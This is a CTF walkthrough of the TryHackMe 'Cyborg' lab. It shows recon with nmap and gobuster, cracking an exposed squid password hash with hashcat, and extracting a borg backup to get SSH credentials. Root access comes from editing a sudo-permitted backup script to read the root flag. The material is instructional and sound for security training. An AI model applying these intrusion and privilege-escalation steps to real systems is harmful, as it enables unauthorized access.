# Cyborg Walkthrough

Welcome to the Lookup challenge, here is the link to the [room](https://tryhackme.com/room/cyborgt8) on TryHackMe.

This is a box involving encrypted archives, source code analysis and more...

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP cyborg.thm" | sudo tee -a /etc/hosts
```

Now we scan for open ports with *nmap*:
```bash
nmap -sV -sC cyborg.thm
```

The tool finds 2 open ports:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

We can visit the website: `http://cyborg.thm`, here we see the default Apache2 server page.
This by itself is not much interesting, let's see if there are any hidden directories:
```bash
gobuster dir -u http://cyborg.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 64  
```

This got me:
```
admin                (Status: 301) [Size: 308] [--> http://cyborg.thm/admin/]
/etc                  (Status: 301) [Size: 306] [--> http://cyborg.thm/etc/]
/index.html           (Status: 200) [Size: 11321]
```

Visiting the `/etc` we can find another directory called `squid` with inside 2 files: `passwd` and `squid.conf`.
The first file contains:
```
music_archive:REDACTED_PASSWORD_HASH
```

This is the hash of the music_archive user.
And in the second one we see:
```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

Basically is telling us that for the authentication it is using the credentials found in the first file.
We need to find the hash type and crack it to get the password:
- Since it contains `$apr1$` it means it is an apache md5 hash, mode 1600 for *hashcat*:
```bash
hashcat -a 0 -m 1600 hash.txt --wordlist rockyou.txt --username
```
--> squidward

Now looking at `http://cyborg.thm/admin` we find Alex's website.

If we click on admin it opens a page with this messages:
```
                ############################################
                ############################################
                [Yesterday at 4.32pm from Josh]
                Are we all going to watch the football game at the weekend??
                ############################################
                ############################################
                [Yesterday at 4.33pm from Adam]
                Yeah Yeah mate absolutely hope they win!
                ############################################
                ############################################
                [Yesterday at 4.35pm from Josh]
                See you there then mate!
                ############################################
                ############################################
                [Today at 5.45am from Alex]
                Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
                I decided to give up like i always do ahahaha sorry about that.
                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
                Might pass it over to the IT guys but in the meantime all the config files are laying about.
                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
                other than that im pretty sure my backup "music_archive" is safe just to confirm.
                ############################################
                ############################################
```

Now there is also an option to download something, click it:
```
 http://cyborg.thm/admin/archive.tar
```

It will download an archive file, we can extract the files with:
```bash
 tar -xf archive.tar
```

This creates an `home` directory, going deep inside we land on the `final_archive` one which contains a *borg* backup.
We can inspect which versions are inside:
```bash
borg list .
```

When prompted insert the password we have discovered before.

We see the archive name, now we can extract it:
```bash
borg extract ./::music_archive
```

This will create another `home` directory, exploring inside we find Alex documents, there is a note.txt file.
```bash
cat note.txt
```

Here there is Alex password: `alex:REDACTED_PASSWORD`

Now we can use this credentials to login via ssh:
```bash
ssh alex@cyborg.thm
```

Let's get the flag:
```
cat user.txt
```
--> flag{REDACTED}

<br/>

### Privilege Escalation
Let's begin by checking if we can run anything as `sudo`:
```bash
sudo -l
```

Yes we do:
```
(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Check what this script file permissions and content:
```bash
ls -l /etc/mp3backups/backup.sh
```
```bash
-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
```

```bash
cat /etc/mp3backups/backup.sh
```

As we can see we have only execute and read permission, but since the file is created and owned by our user we can add write permissions:
```bash
chmod +w backup.sh
```

Now we can simply add this line at the top or bottom:
```bash
cat /root/root.txt
```

Finally run the script, it will print the last flag:
```bash
sudo ./backup.sh
```

--> flag{REDACTED}

<br/>
<br/>

## Conclusion
Congratulations you have successfully played with cracking hashes and decrypting archives to find sensitive data and read the flags.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
